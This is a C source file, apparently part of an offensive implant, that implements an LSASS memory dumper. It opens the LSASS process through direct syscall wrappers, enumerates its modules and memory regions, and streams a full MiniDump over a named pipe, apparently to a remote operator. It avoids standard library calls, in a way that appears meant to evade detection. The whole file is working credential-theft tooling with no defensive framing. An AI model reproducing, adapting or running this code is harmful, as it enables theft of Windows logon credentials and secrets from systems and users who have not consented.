/**
 * LSASS memory dump — reads process memory via NtReadVirtualMemory,
 * streams as MiniDump format through the named pipe.
 * All allocations via NtAllocateVirtualMemory, OS version from PEB.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

#pragma pack(push, 1)

typedef struct _MDMP_HEADER {
    DWORD Signature;
    WORD  Version;
    WORD  ImplementationVersion;
    DWORD NumberOfStreams;
    DWORD StreamDirectoryRva;
    DWORD CheckSum;
    DWORD TimeDateStamp;
    ULONG64 Flags;
} MDMP_HEADER;

typedef struct _MDMP_DIRECTORY {
    DWORD StreamType;
    DWORD DataSize;
    DWORD Rva;
} MDMP_DIRECTORY;

typedef struct _MDMP_SYSTEM_INFO {
    WORD  ProcessorArchitecture;
    WORD  ProcessorLevel;
    WORD  ProcessorRevision;
    BYTE  NumberOfProcessors;
    BYTE  ProductType;
    DWORD MajorVersion;
    DWORD MinorVersion;
    DWORD BuildNumber;
    DWORD PlatformId;
    DWORD CSDVersionRva;
    WORD  SuiteMask;
    WORD  Reserved2;
    BYTE  CpuInfo[24];
} MDMP_SYSTEM_INFO;

typedef struct _MDMP_MEMORY_DESCRIPTOR64 {
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
} MDMP_MEMORY_DESCRIPTOR64;

typedef struct _MDMP_MEMORY64_LIST_HEADER {
    ULONG64 NumberOfMemoryRanges;
    ULONG64 BaseRva;
} MDMP_MEMORY64_LIST_HEADER;

#pragma pack(pop)

#define CSDVERSION_SIZE 8

typedef struct _MODULE_INFO {
    PVOID  base;
    DWORD  size;
    DWORD  timestamp;
    WCHAR  name[260];
    DWORD  name_len;
} MODULE_INFO;

#define MAX_MODULES 256

/* inline memset replacement */
static inline void zero_mem(void *dst, SIZE_T len) {
    BYTE *p = (BYTE *)dst;
    while (len--) *p++ = 0;
}

static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_modules) {
    DWORD count = 0;
    PROCESS_BASIC_INFORMATION pbi;
    zero_mem(&pbi, sizeof(pbi));
    SIZE_T ret_len;

    NTSTATUS status = sys_NtQueryInformationProcess(
        process, ProcessBasicInformation, &pbi, sizeof(pbi), (PULONG)&ret_len
    );
    if (status != 0 || !pbi.PebBaseAddress) return 0;

    PEB peb;
    zero_mem(&peb, sizeof(peb));
    status = sys_NtReadVirtualMemory(process, pbi.PebBaseAddress, &peb, sizeof(peb), &ret_len);
    if (status != 0 || !peb.Ldr) return 0;

    PEB_LDR_DATA ldr;
    zero_mem(&ldr, sizeof(ldr));
    status = sys_NtReadVirtualMemory(process, peb.Ldr, &ldr, sizeof(ldr), &ret_len);
    if (status != 0) return 0;

    PVOID list_head = (BYTE*)peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InMemoryOrderModuleList);
    PVOID current_link = ldr.InMemoryOrderModuleList.Flink;

    while (current_link != list_head && count < max_modules) {
        BYTE entry_buf[sizeof(LDR_DATA_TABLE_ENTRY)];
        zero_mem(entry_buf, sizeof(entry_buf));
        PVOID entry_addr = (BYTE*)current_link - 0x10;

        status = sys_NtReadVirtualMemory(process, entry_addr, entry_buf, sizeof(LDR_DATA_TABLE_ENTRY), &ret_len);
        if (status != 0) break;

        LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)entry_buf;

        if (entry->DllBase && entry->SizeOfImage) {
            modules[count].base = entry->DllBase;
            modules[count].size = entry->SizeOfImage;
            modules[count].timestamp = entry->TimeDateStamp;
            modules[count].name_len = 0;

            if (entry->FullDllName.Length && entry->FullDllName.Buffer) {
                DWORD name_bytes = entry->FullDllName.Length;
                if (name_bytes > sizeof(modules[count].name) - 2)
                    name_bytes = sizeof(modules[count].name) - 2;
                status = sys_NtReadVirtualMemory(process, entry->FullDllName.Buffer,
                    modules[count].name, name_bytes, &ret_len);
                if (status == 0) {
                    modules[count].name_len = name_bytes;
                    modules[count].name[name_bytes / 2] = 0;
                }
            }
            count++;
        }

        current_link = entry->InMemoryOrderLinks.Flink;
    }

    return count;
}

typedef struct _REGION_INFO {
    PVOID  base;
    SIZE_T size;
} REGION_INFO;

#define MAX_REGIONS 4096

static DWORD enumerate_regions(HANDLE process, REGION_INFO *regions, DWORD max_regions) {
    DWORD count = 0;
    PVOID addr = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T ret_len;

    while (count < max_regions) {
        NTSTATUS status = sys_NtQueryVirtualMemory(
            process, addr, MemoryBasicInformation,
            &mbi, sizeof(mbi), &ret_len
        );

        if (status != 0) break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ |
                           PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            regions[count].base = mbi.BaseAddress;
            regions[count].size = mbi.RegionSize;
            count++;
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)addr < (ULONG_PTR)mbi.BaseAddress) break;
    }

    return count;
}

/* ── Helper: allocate memory via NtAllocateVirtualMemory ─── */

static PVOID alloc_mem(SIZE_T size) {
    PVOID base = NULL;
    SIZE_T region = size;
    NTSTATUS status = sys_NtAllocateVirtualMemory(
        (HANDLE)-1, &base, 0, &region,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    return NT_SUCCESS(status) ? base : NULL;
}

static void free_mem(PVOID ptr) {
    if (!ptr) return;
    SIZE_T size = 0;
    sys_NtFreeVirtualMemory((HANDLE)-1, &ptr, &size, MEM_RELEASE);
}

/* ── Main dump function ──────────────────────────────────── */

BOOL dump_lsass(DWORD pid, HANDLE pipe) {
    HANDLE process = NULL;
    OBJECT_ATTRIBUTES oa;
    zero_mem(&oa, sizeof(oa));
    oa.Length = sizeof(oa);
    CLIENT_ID cid;
    zero_mem(&cid, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    NTSTATUS status = sys_NtOpenProcess(
        &process,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        &oa,
        &cid
    );

    if (status != 0 || !process)
        return FALSE;

    /* Enumerate memory regions */
    REGION_INFO *regions = (REGION_INFO *)alloc_mem(sizeof(REGION_INFO) * MAX_REGIONS);
    if (!regions) {
        sys_NtClose(process);
        return FALSE;
    }

    DWORD region_count = enumerate_regions(process, regions, MAX_REGIONS);
    if (region_count == 0) {
        free_mem(regions);
        sys_NtClose(process);
        return FALSE;
    }

    /* Enumerate modules from PEB */
    MODULE_INFO *modules = (MODULE_INFO *)alloc_mem(sizeof(MODULE_INFO) * MAX_MODULES);
    DWORD module_count = 0;
    if (modules)
        module_count = enumerate_modules(process, modules, MAX_MODULES);

    /* Layout: header + dirs + CSDVersion string + SystemInfo + modules + mem64list + data */
    DWORD num_streams = module_count > 0 ? 3 : 2;
    DWORD header_size = sizeof(MDMP_HEADER);
    DWORD dir_size = sizeof(MDMP_DIRECTORY) * num_streams;
    DWORD sysinfo_size = sizeof(MDMP_SYSTEM_INFO);

    DWORD csdver_rva = header_size + dir_size + sysinfo_size;

    DWORD module_list_size = 0;
    DWORD module_names_size = 0;
    if (module_count > 0) {
        module_list_size = 4 + 108 * module_count;
        for (DWORD i = 0; i < module_count; i++) {
            module_names_size += 4 + modules[i].name_len + 2;
            if ((modules[i].name_len + 2) % 4 != 0)
                module_names_size += 4 - ((modules[i].name_len + 2) % 4);
        }
    }

    DWORD mem64_header_size = sizeof(MDMP_MEMORY64_LIST_HEADER) +
                              sizeof(MDMP_MEMORY_DESCRIPTOR64) * region_count;

    DWORD sysinfo_rva = header_size + dir_size;
    DWORD modlist_rva = csdver_rva + CSDVERSION_SIZE;
    DWORD modnames_rva = modlist_rva + module_list_size;
    DWORD mem64_rva = modnames_rva + module_names_size;
    DWORD data_rva = mem64_rva + mem64_header_size;

    /* Header */
    MDMP_HEADER hdr;
    zero_mem(&hdr, sizeof(hdr));
    hdr.Signature = MDMP_SIGNATURE;
    hdr.Version = MDMP_VERSION;
    hdr.ImplementationVersion = 0;
    hdr.NumberOfStreams = num_streams;
    hdr.StreamDirectoryRva = header_size;
    hdr.CheckSum = 0;
    hdr.TimeDateStamp = get_tick();
    hdr.Flags = 0x00000002;  /* MiniDumpWithFullMemory */

    write_pipe(pipe, &hdr, sizeof(hdr));

    /* Stream directory */
    MDMP_DIRECTORY dirs[3];
    zero_mem(dirs, sizeof(dirs));
    DWORD di = 0;
    dirs[di].StreamType = STREAM_SYSTEM_INFO;
    dirs[di].DataSize = sysinfo_size;
    dirs[di].Rva = sysinfo_rva;
    di++;
    if (module_count > 0) {
        dirs[di].StreamType = STREAM_MODULE_LIST;
        dirs[di].DataSize = module_list_size;
        dirs[di].Rva = modlist_rva;
        di++;
    }
    dirs[di].StreamType = STREAM_MEMORY64_LIST;
    dirs[di].DataSize = mem64_header_size;
    dirs[di].Rva = mem64_rva;

    write_pipe(pipe, dirs, sizeof(MDMP_DIRECTORY) * num_streams);

    /* SystemInfo stream — version from PEB */
    MDMP_SYSTEM_INFO sysinfo;
    zero_mem(&sysinfo, sizeof(sysinfo));
    sysinfo.ProcessorArchitecture = 9;  /* AMD64 */
    sysinfo.NumberOfProcessors = 1;
    sysinfo.ProductType = 1;
    sysinfo.MajorVersion = get_os_major();
    sysinfo.MinorVersion = get_os_minor();
    sysinfo.BuildNumber = get_os_build();
    sysinfo.PlatformId = 2;  /* VER_PLATFORM_WIN32_NT */
    sysinfo.CSDVersionRva = csdver_rva;

    write_pipe(pipe, &sysinfo, sizeof(sysinfo));

    /* CSDVersion string: empty MINIDUMP_STRING */
    BYTE csdver[CSDVERSION_SIZE];
    zero_mem(csdver, CSDVERSION_SIZE);
    write_pipe(pipe, csdver, CSDVERSION_SIZE);

    /* ModuleList stream */
    if (module_count > 0) {
        write_pipe(pipe, &module_count, 4);

        DWORD name_rva_cursor = modnames_rva;

        for (DWORD i = 0; i < module_count; i++) {
            BYTE mod_entry[108];
            zero_mem(mod_entry, 108);
            *(ULONG64 *)&mod_entry[0] = (ULONG64)(ULONG_PTR)modules[i].base;
            *(DWORD *)&mod_entry[8] = modules[i].size;
            *(DWORD *)&mod_entry[12] = 0;
            *(DWORD *)&mod_entry[16] = modules[i].timestamp;
            *(DWORD *)&mod_entry[20] = name_rva_cursor;
            write_pipe(pipe, mod_entry, 108);

            DWORD str_size = 4 + modules[i].name_len + 2;
            if ((modules[i].name_len + 2) % 4 != 0)
                str_size += 4 - ((modules[i].name_len + 2) % 4);
            name_rva_cursor += str_size;
        }

        for (DWORD i = 0; i < module_count; i++) {
            DWORD byte_count = modules[i].name_len;
            write_pipe(pipe, &byte_count, 4);
            write_pipe(pipe, modules[i].name, byte_count);
            BYTE pad[6];
            zero_mem(pad, 6);
            DWORD pad_len = 2;
            if ((byte_count + 2) % 4 != 0)
                pad_len += 4 - ((byte_count + 2) % 4);
            write_pipe(pipe, pad, pad_len);
        }
    }

    /* Memory64List header */
    MDMP_MEMORY64_LIST_HEADER mem64hdr;
    zero_mem(&mem64hdr, sizeof(mem64hdr));
    mem64hdr.NumberOfMemoryRanges = region_count;
    mem64hdr.BaseRva = data_rva;
    write_pipe(pipe, &mem64hdr, sizeof(mem64hdr));

    /* Memory64 descriptors */
    for (DWORD i = 0; i < region_count; i++) {
        MDMP_MEMORY_DESCRIPTOR64 desc;
        desc.StartOfMemoryRange = (ULONG64)(ULONG_PTR)regions[i].base;
        desc.DataSize = regions[i].size;
        write_pipe(pipe, &desc, sizeof(desc));
    }

    /* Memory data — stream each region */
    BYTE *buf = (BYTE *)alloc_mem(65536);

    for (DWORD i = 0; i < region_count; i++) {
        SIZE_T remaining = regions[i].size;
        PVOID addr = regions[i].base;

        while (remaining > 0) {
            SIZE_T to_read = remaining > 65536 ? 65536 : remaining;
            SIZE_T bytes_read = 0;

            status = sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
            if (status != 0 || bytes_read == 0) {
                zero_mem(buf, (SIZE_T)to_read);
                bytes_read = to_read;
            }

            write_pipe(pipe, buf, (DWORD)bytes_read);
            addr = (BYTE *)addr + bytes_read;
            remaining -= bytes_read;
        }
    }

    free_mem(buf);
    free_mem(regions);
    free_mem(modules);
    sys_NtClose(process);

    return TRUE;
}
